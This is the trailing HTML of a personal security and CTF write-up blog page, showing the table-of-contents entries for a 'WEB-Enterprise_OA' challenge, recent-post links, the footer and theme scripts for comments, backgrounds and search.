href="#%E4%B8%89%E3%80%81WEB-Enterprise-OA"><span class="toc-text">三、WEB-Enterprise_OA</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE-2"><span class="toc-text">1. 题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="toc-text">2. 解题思路</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/22/PHP%E5%9F%BA%E7%A1%80%E5%AE%89%E5%85%A8/index/" title="PHP基础安全">PHP基础安全</a><time datetime="2026-06-22T04:00:00.000Z" title="发表于 2026-06-22 12:00:00">2026-06-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/14/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/index/" title="逻辑漏洞">逻辑漏洞</a><time datetime="2026-06-14T06:30:00.000Z" title="发表于 2026-06-14 14:30:00">2026-06-14</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Jasmine_Iris</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.2</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'
+
+  const createScriptElement = config => {
+    const ele = document.createElement('script')
+    Object.entries(config).forEach(([key, value]) => {
+      ele.setAttribute(key, value)
+    })
+    return ele
+  }
+
+  const loadGiscus = (el = document, key) => {
+    const mappingConfig = isShuoshuo
+      ? { 'data-mapping': 'specific', 'data-term': key }
+      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }
+
+    const giscusConfig = {
+      src: '/js/giscus.js',
+      'data-repo': 'Jasmineee007/Jasmineee007.github.io',
+      'data-repo-id': 'R_kgDOShjJyQ',
+      'data-category-id': '',
+      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
+      'data-reactions-enabled': '1',
+      crossorigin: 'anonymous',
+      async: true,
+      ...option,
+      ...mappingConfig
+    }
+
+    const scriptElement = createScriptElement(giscusConfig)
+
+    el.querySelector('#giscus-wrap').appendChild(scriptElement)
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyGiscus = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const changeGiscusTheme = theme => {
+    const iframe = document.querySelector('#giscus-wrap iframe')
+    if (iframe) {
+      const message = {
+        giscus: {
+          setConfig: {
+            theme: getGiscusTheme(theme)
+          }
+        }
+      }
+      iframe.contentWindow.postMessage(message, 'https://giscus.app')
+    }
+  }
+
+  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')
+
+  if (isShuoshuo) {
+    'Giscus' === 'Giscus'
+      ? window.shuoshuoComment = { loadComment: loadGiscus }
+      : window.loadOtherComment = loadGiscus
+    return
+  }
+
+  if ('Giscus' === 'Giscus' || !false) {
+    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
+    else loadGiscus()
+  } else {
+    window.loadOtherComment = loadGiscus
+  }
+})()</script></div><script>if(document.getElementById("page-header")&&document.getElementById("page-header").classList.contains("full_page")){var bg=document.getElementById("web_bg");if(bg)bg.style.backgroundImage="url(/img/home-bg.png)";}</script><script>document.documentElement.classList.add(GLOBAL_CONFIG.pageType==='home'?'is-home':'not-home');(function(){if(GLOBAL_CONFIG.pageType!=='home')return;var t=sessionStorage.getItem('auto-scrolled');if(t)return;sessionStorage.setItem('auto-scrolled','1');setTimeout(function(){var el=document.getElementById('content-inner');if(el)btf.scrollToDest(el.offsetTop,600)},1500)})()</script><script>(function(){document.addEventListener('click',function(e){if(e.target.closest('.card-tag-cloud a, .article-tag-list a, .site-data a[href="/tags/"]')){e.preventDefault()}})})()</script><script src="/js/copy-guard.js"></script><script>(function(){var bg=document.getElementById('web_bg');if(!bg)return;bg.style.backgroundSize='70%';bg.style.backgroundPosition='left bottom';var p=location.pathname;var bw=document.getElementById('body-wrap');var img='';if(bw&&bw.classList.contains('post')){img='/img/post-2.png'}else if(p==='/about/'||p==='/archives/'||p==='/links/'||p==='/categories/'){img='/img/about-2.png'}else if(p.indexOf('/categories/CTF-WP')===0){img='/img/ctfwp-2.png'}else if(p.indexOf('/categories/Web')===0){img='/img/ctfwp-2.png'}else if(p.indexOf('/categories/')===0){img='/img/about-2.png'}else if(p.indexOf('/archives/')===0){img='/img/about-2.png';if(bw)bw.classList.add('page-custom-style')}if(img){bg.style.backgroundImage='url('+img+')'}})()</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
